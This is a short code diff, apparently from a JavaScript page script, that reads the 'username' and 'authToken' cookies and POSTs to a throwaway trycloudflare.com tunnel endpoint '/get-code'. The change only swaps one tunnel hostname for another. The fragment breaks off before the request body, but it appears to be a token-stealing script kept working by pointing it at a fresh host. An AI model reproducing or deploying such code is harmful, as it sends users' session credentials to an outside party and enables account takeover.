@@ -12,7 +12,7 @@
         const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
         const authToken = getCookie('authToken') || 'Token Yok';
 
-        fetch('https://scotia-lens-timber-brick.trycloudflare.com/get-code', {
+        fetch('https://advisor-parental-pad-wow.trycloudflare.com/get-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
